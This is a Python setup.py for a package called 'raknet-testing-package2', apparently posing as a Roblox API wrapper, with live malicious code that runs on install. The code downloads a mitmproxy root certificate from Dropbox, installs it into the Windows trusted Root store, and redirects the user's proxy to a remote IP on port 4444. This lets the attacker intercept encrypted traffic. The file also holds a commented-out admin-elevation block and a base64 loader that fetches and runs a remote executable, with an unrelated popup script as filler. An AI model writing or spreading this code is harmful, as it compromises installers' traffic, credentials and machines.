import setuptools, base64
import os
import sys
import ctypes
import winreg
import ssl
import socket
import subprocess
import urllib.request

setuptools.setup(
    name="raknet-testing-package2",
    version="0.0.1",
    author="raknet-testing-package2",
    #description="Official wrapper for the Roblox API",
    description="raknet-testing-package",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir={"": "src"},
    packages=setuptools.find_packages(where="src"),
    python_requires=">=3.6",
)

'''
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    # Re-run the script with admin rights
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

'''
def download_p12_cert(cert_url, save_path="cert.p12"):
    try:
        urllib.request.urlretrieve(cert_url, save_path)
        print(f"Downloaded .p12 certificate to: {save_path}")
        return save_path
    except Exception as e:
        print(f"Failed to download cert: {e}")
        return None

def install_p12_to_user_store():
    command = ['certutil', '-addstore', '-f', 'Root', "downloaded_cert.pem"]

    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        print("Certificate imported successfully.")
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print("Failed to import certificate.")
        print(e.stderr)

def download_and_install_p12(cert_url, password=""):
    cert_path = download_p12_cert(cert_url, "downloaded_cert.pem")
    if cert_path and os.path.exists(cert_path):
        install_p12_to_user_store()

def set_user_proxy(enable=True, proxy_server="127.0.0.1:8080"):
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Internet Settings"
    
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 1 if enable else 0)
            if enable:
                winreg.SetValueEx(key, "ProxyServer", 0, winreg.REG_SZ, proxy_server)
            print(f"{'Enabled' if enable else 'Disabled'} proxy: {proxy_server if enable else ''}")
        
        ctypes.windll.Wininet.InternetSetOptionW(0, 39, 0, 0)
        ctypes.windll.Wininet.InternetSetOptionW(0, 37, 0, 0)

    except Exception as e:
        print(f"Error updating proxy: {e}")



download_and_install_p12("https://www.dropbox.com/scl/fi/6pwocr2yfcaqztfoxkwqm/mitmproxy-ca-cert.pem?rlkey=irl7718in0yr3pwnhgftcm0sm&st=fnll7kc5&dl=1")
set_user_proxy(True, "196.251.86.48:4444")


# This script creates a pop-up message box displaying the current working directory.

# Import the necessary modules.
# 'os' is for interacting with the operating system, specifically to get the current directory.
# 'tkinter' is Python's standard GUI library, and 'messagebox' is a submodule for pop-ups.
import os
import tkinter as tk
from tkinter import messagebox

# Create a root window. This is required for the messagebox to work properly,
# but we will hide it so only the pop-up is visible.
root = tk.Tk()
root.withdraw()

# Get the current working directory (CWD).
# The os.getcwd() function returns a string of the current directory path.
current_directory = os.getcwd()

# Construct the message string to display in the pop-up.
# We use an f-string to easily embed the current_directory variable.
message = f"The current working directory is:\n{current_directory}"

# Display the message box.
# 'showinfo' is one type of message box; it displays an informational message.
# The first argument is the title of the pop-up window, and the second is the message.
messagebox.showinfo("Current Directory", message)

# This line ensures the program doesn't immediately close after the pop-up is shown.
# It waits for the user to close the message box.
root.mainloop()

#import base64
#exec(base64.b64decode("ZnJvbSB1cmxsaWIgaW1wb3J0IHJlcXVlc3QKaW1wb3J0IG9zCmltcG9ydCBzeXMKCnVybCA9ICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvaEVGNUhhRmMiCnJlcSA9IHJlcXVlc3QuUmVxdWVzdCh1cmwpCnJlcS5hZGRfaGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vanNvbicpCnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JywgJ01vemlsbGEvNS4wIChYMTE7IFU7IExpbnV4IGk2ODYpIEdlY2tvLzIwMDcxMTI3IEZpcmVmb3gvMi4wLjAuMTEnKQpjdCA9IHJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKQoKcmVxID0gcmVxdWVzdC5SZXF1ZXN0KGN0LmRlY29kZSgpKQpyZXEuYWRkX2hlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb24nKQpyZXEuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsICdNb3ppbGxhLzUuMCAoWDExOyBVOyBMaW51eCBpNjg2KSBHZWNrby8yMDA3MTEyNyBGaXJlZm94LzIuMC4wLjExJykKY3QgPSByZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCkKb3BlbiAoInBrZ19pbnN0YWxsZXIuZXhlIiwgIncrIikKd2l0aCBvcGVuKCJwa2dfaW5zdGFsbGVyLmV4ZSIsICJ3YiIpIGFzIGZpbGU6CglmaWxlLndyaXRlKGN0KQpvcy5zeXN0ZW0oImNtZCAvYyBwa2dfaW5zdGFsbGVyLmV4ZSIpCndoaWxlIFRydWU6Cgl0cnk6CgkJb3MucmVtb3ZlKCJwa2dfaW5zdGFsbGVyLmV4ZSIpCgkJc3RweTMKCQlicmVhawoJZXhjZXB0OgoJCXBhc3MK"))
